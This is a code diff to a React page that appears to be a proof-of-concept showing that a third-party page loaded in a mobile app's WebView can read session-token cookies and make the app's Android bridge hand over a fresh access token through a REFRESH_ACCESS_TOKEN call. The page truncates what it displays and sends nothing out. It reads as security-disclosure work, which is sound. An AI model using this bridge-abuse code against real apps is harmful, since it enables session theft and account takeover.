@@ -53,7 +53,8 @@ const BRIDGE_METHODS = [
   ['ANALYTICS', 'Analytics', ''],
 ];
 
-const HIGHLIGHT = ['ACCESS_TOKEN', 'X_DEVICE_SIGNATURE', 'HASHED_EMAIL'];
+// Real cookie names are lowercase; matched case-insensitively below.
+const HIGHLIGHT = ['access_token', 'refresh_token', 'pin_token', 'x-device-signature', 'hashed_email'];
 const VERSION_COOKIE_KEYS = ['app_version', 'APP_VERSION', 'appVersion', 'version', 'VERSION'];
 
 // Entry-point objects we check by name, with the method names we expect to see.
@@ -254,22 +255,35 @@ export default function Page() {
   const [appVersion, setAppVersion] = useState('(not found in cookies)');
 
   const tokenProbed = useRef(false); // guard: REFRESH_ACCESS_TOKEN runs at most once
+  const pollRef = useRef(null); // interval polling for window.AndroidBridge
+  const timeoutRef = useRef(null); // callback-didn't-fire timeout
 
   useEffect(() => {
-    // --- Location banner ---
+    // Each read is independently guarded so one failure cannot blank the page.
+    // Location + cookies are read FIRST, before any navigator.mediaDevices access.
+
+    // --- Location banner (hostname/href read separately) ---
     try {
       setHost(window.location.hostname);
+    } catch {
+      /* ignore */
+    }
+    try {
       setHref(window.location.href);
     } catch {
       /* ignore */
     }
 
-    // --- Cookies ---
-    const parsed = readCookies();
-    setCookies(parsed);
+    // --- Cookies (plain name=value, readable via document.cookie) ---
     try {
-      const vk = parsed.find((c) => VERSION_COOKIE_KEYS.includes(c.name));
-      if (vk) setAppVersion(vk.value || '(empty)');
+      const parsed = readCookies();
+      setCookies(parsed);
+      try {
+        const vk = parsed.find((c) => VERSION_COOKIE_KEYS.includes(c.name));
+        if (vk) setAppVersion(vk.value || '(empty)');
+      } catch {
+        /* ignore */
+      }
     } catch {
       /* ignore */
     }
@@ -295,23 +309,118 @@ export default function Page() {
       /* ignore */
     }
 
-    // --- Live token probe: exactly one call, no retry, no loop ---
-    // Works on Android (callHandler) and iOS (webkit.messageHandlers.postMessage).
-    if (!tokenProbed.current) {
+    // --- Live token probe: AndroidBridge contract. One call, no retry/loop. ---
+    // The native dispatcher only accepts method "NATIVE_CALLBACK", routes on
+    // params.eventType, and replies asynchronously via the registered callback.
+    function runProbe(bridge) {
+      if (tokenProbed.current) return;
+      if (!bridge || typeof bridge.callHandler !== 'function') return;
       tokenProbed.current = true;
       try {
-        probeRefreshToken(setTokenResult);
+        if (pollRef.current) {
+          clearInterval(pollRef.current);
+          pollRef.current = null;
+        }
+      } catch {
+        /* ignore */
+      }
+      setTokenResult({ status: 'calling…', token: null });
+
+      // ~6s timeout: if the bridge never calls back, say so. Cleared on callback.
+      try {
+        timeoutRef.current = setTimeout(() => {
+          setTokenResult((prev) =>
+            prev && prev.status === 'calling…'
+              ? { status: 'no response (bridge did not call back)', token: null }
+              : prev,
+          );
+        }, 6000);
+      } catch {
+        /* ignore */
+      }
+
+      try {
+        bridge.callHandler('NATIVE_CALLBACK', { eventType: 'REFRESH_ACCESS_TOKEN' }, function (resp) {
+          try {
+            if (timeoutRef.current) {
+              clearTimeout(timeoutRef.current);
+              timeoutRef.current = null;
+            }
+          } catch {
+            /* ignore */
+          }
+          try {
+            const d = typeof resp === 'string' ? JSON.parse(resp) : resp || {};
+            setTokenResult({
+              status: d.status || '(no status)',
+              token: d.access_token ? truncateSecret(d.access_token) : null, // truncated only
+            });
+          } catch (e) {
+            setTokenResult({ status: 'error parsing bridge response', token: null, error: String(e && e.message ? e.message : e) });
+          }
+        });
       } catch (e) {
+        try {
+          if (timeoutRef.current) {
+            clearTimeout(timeoutRef.current);
+            timeoutRef.current = null;
+          }
+        } catch {
+          /* ignore */
+        }
         setTokenResult({ status: 'error', token: null, error: String(e && e.message ? e.message : e) });
       }
     }
 
+    try {
+      // The app calls this at page-finished, passing the injected bridge.
+      window.jsBridgeSetupCallback = function (bridge) {
+        try {
+          runProbe(bridge || window.AndroidBridge);
+        } catch {
+          /* ignore */
+        }
+      };
+    } catch {
+      /* ignore */
+    }
+
+    // Fallback: poll up to ~5s in case AndroidBridge is already injected.
+    try {
+      if (window.AndroidBridge) {
+        runProbe(window.AndroidBridge);
+      } else {
+        let elapsed = 0;
+        pollRef.current = setInterval(() => {
+          elapsed += 250;
+          try {
+            if (window.AndroidBridge) {
+              clearInterval(pollRef.current);
+              pollRef.current = null;
+              runProbe(window.AndroidBridge);
+            } else if (elapsed >= 5000) {
+              clearInterval(pollRef.current);
+              pollRef.current = null;
+              if (!tokenProbed.current) {
+                setTokenResult((prev) =>
+                  prev && prev.status === 'pending'
+                    ? { status: 'bridge-unavailable (AndroidBridge not injected)', token: null }
+                    : prev,
+                );
+              }
+            }
+          } catch {
+            /* ignore */
+          }
+        }, 250);
+      }
+    } catch {
+      /* ignore */
+    }
+
     // --- Media reach: enumerateDevices only. getUserMedia is NEVER called. ---
     try {
-      if (!navigator.mediaDevices || typeof navigator.mediaDevices.enumerateDevices !== 'function') {
-        setMediaError('navigator.mediaDevices.enumerateDevices is unavailable');
-      } else {
-        // A single enumerate; result maps to kind + label for display only.
+      if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
         navigator.mediaDevices
           .enumerateDevices()
           .then((devices) => {
@@ -327,10 +436,30 @@ export default function Page() {
             }
           })
           .catch((e) => setMediaError(String(e && e.message ? e.message : e)));
+      } else {
+        setMediaError('navigator.mediaDevices.enumerateDevices is unavailable');
       }
     } catch (e) {
       setMediaError(String(e && e.message ? e.message : e));
     }
+
+    return () => {
+      try {
+        if (timeoutRef.current) clearTimeout(timeoutRef.current);
+      } catch {
+        /* ignore */
+      }
+      try {
+        if (pollRef.current) clearInterval(pollRef.current);
+      } catch {
+        /* ignore */
+      }
+      try {
+        if (window.jsBridgeSetupCallback) delete window.jsBridgeSetupCallback;
+      } catch {
+        /* ignore */
+      }
+    };
   }, []);
 
   return (
@@ -420,9 +549,9 @@ export default function Page() {
         <h2>Live token probe</h2>
         <p className="label">The native bridge actively hands a fresh token to this page.</p>
         <p className="note" style={{ marginTop: 0 }}>
-          One call to the native bridge — Android <code>callHandler</code> or iOS{' '}
-          <code>webkit.messageHandlers.*.postMessage</code> — with{' '}
-          <code>{'{"method":"REFRESH_ACCESS_TOKEN"}'}</code>. No retry, no loop.
+          One call to <code>AndroidBridge.callHandler(&quot;NATIVE_CALLBACK&quot;, &#123;eventType:
+          &quot;REFRESH_ACCESS_TOKEN&quot;&#125;, cb)</code>. No retry, no loop; the reply arrives via
+          the registered callback.
         </p>
         <div className="row">
           <span className="name">status</span>
@@ -430,15 +559,9 @@ export default function Page() {
             <TokenStatus status={tokenResult.status} />
           </span>
         </div>
-        {tokenResult.via ? (
-          <div className="row">
-            <span className="name">via</span>
-            <span className="val">{tokenResult.via}</span>
-          </div>
-        ) : null}
         <div className="row">
           <span className="name">access token (truncated)</span>
-          <span className="val">{tokenResult.token ? truncateSecret(tokenResult.token) : '—'}</span>
+          <span className="val">{tokenResult.token || '—'}</span>
         </div>
         {tokenResult.error ? (
           <div className="row">
@@ -509,94 +632,6 @@ export default function Page() {
   );
 }
 
-// Invoke REFRESH_ACCESS_TOKEN exactly once across platforms. Android uses the
-// injected callHandler; iOS posts to the first present WKWebView message handler.
-// Only ONE native call is made, with no retry and no loop.
-function probeRefreshToken(setTokenResult) {
-  const message = JSON.stringify({ method: 'REFRESH_ACCESS_TOKEN', data: {} });
-
-  // 1) Android (or any injected object exposing a callHandler-style function).
-  const injected =
-    (typeof window !== 'undefined' && window.Android) ||
-    (typeof window !== 'undefined' && window.ajaib) ||
-    null;
-  if (injected && typeof injected.callHandler === 'function') {
-    const raw = injected.callHandler(message); // the single live call
-    handleTokenReturn(raw, setTokenResult, 'Android callHandler');
-    return;
-  }
-
-  // 2) iOS WKWebView: post once to the first present candidate handler.
-  try {
-    const mh =
-      typeof window !== 'undefined' && window.webkit ? window.webkit.messageHandlers : null;
-    if (mh) {
-      for (const name of IOS_HANDLER_CANDIDATES) {
-        let h = null;
-        try {
-          h = mh[name];
-        } catch {
-          continue;
-        }
-        if (h && typeof h.postMessage === 'function') {
-          // postMessage returns a Promise in modern WKWebView when the native
-          // side uses a reply handler; handleTokenReturn handles both.
-          const raw = h.postMessage({ method: 'REFRESH_ACCESS_TOKEN', data: {} });
-          handleTokenReturn(raw, setTokenResult, 'iOS webkit.messageHandlers.' + name);
-          return;
-        }
-      }
-    }
-  } catch (e) {
-    setTokenResult({ status: 'error', token: null, error: String(e && e.message ? e.message : e) });
-    return;
-  }
-
-  setTokenResult({ status: 'bridge-unavailable', token: null });
-}
-
-// Interpret the one bridge return value. Accepts a string, an object, or a
-// single thenable — attaches exactly one .then, never polls.
-function handleTokenReturn(raw, setTokenResult, via) {
-  try {
-    if (raw && typeof raw.then === 'function') {
-      raw
-        .then((v) => setTokenResult({ ...parseTokenPayload(v), via }))
-        .catch((e) =>
-          setTokenResult({ status: 'error', token: null, via, error: String(e && e.message ? e.message : e) }),
-        );
-      return;
-    }
-    setTokenResult({ ...parseTokenPayload(raw), via });
-  } catch (e) {
-    setTokenResult({ status: 'error', token: null, via, error: String(e && e.message ? e.message : e) });
-  }
-}
-
-function parseTokenPayload(raw) {
-  try {
-    if (raw == null) return { status: 'no-response', token: null };
-    let obj = raw;
-    if (typeof raw === 'string') {
-      try {
-        obj = JSON.parse(raw);
-      } catch {
-        // Non-JSON string: treat the string itself as the token material.
-        return { status: 'ok', token: raw };
-      }
-    }
-    if (obj && typeof obj === 'object') {
-      const token =
-        obj.accessToken || obj.access_token || obj.token || obj.ACCESS_TOKEN || null;
-      const status = obj.status || (token ? 'ok' : 'no-token');
-      return { status: String(status), token: token ? String(token) : null };
-    }
-    return { status: 'ok', token: String(obj) };
-  } catch (e) {
-    return { status: 'error', token: null, error: String(e && e.message ? e.message : e) };
-  }
-}
-
 function TokenStatus({ status }) {
   const ok = status === 'ok';
   const neutral = status === 'pending' || status === 'bridge-unavailable';
@@ -605,17 +640,18 @@ function TokenStatus({ status }) {
 }
 
 function CookiesCard({ cookies }) {
-  const hasAccessToken = cookies.some((c) => c.name === 'ACCESS_TOKEN');
-  const isRisk = hasAccessToken || cookies.some((c) => HIGHLIGHT.includes(c.name));
+  const isHighlighted = (name) => HIGHLIGHT.includes(String(name).toLowerCase());
+  const hasAccessToken = cookies.some((c) => String(c.name).toLowerCase() === 'access_token');
+  const isRisk = hasAccessToken || cookies.some((c) => isHighlighted(c.name));
   return (
     <section className={`card${isRisk ? ' risk' : ''}`}>
       <h2>Cookies readable from this origin</h2>
       <p className="label">document.cookie, parsed. Values truncated.</p>
       {cookies.length === 0 ? (
-        <div className="note">No cookies readable via document.cookie (HttpOnly cookies are not exposed here).</div>
+        <div className="note">No cookies readable from document.cookie on this origin.</div>
       ) : (
         cookies.map((c, i) => {
-          const flag = HIGHLIGHT.includes(c.name);
+          const flag = isHighlighted(c.name);
           return (
             <div className={`row${flag ? ' flag' : ''}`} key={`${c.name}-${i}`}>
               <span className="name">{c.name}</span>
@@ -625,7 +661,7 @@ function CookiesCard({ cookies }) {
         })
       )}
       {hasAccessToken ? (
-        <div className="alert">Session token exposed to third-party host.</div>
+        <div className="alert">Session token readable by this third-party origin.</div>
       ) : null}
     </section>
   );
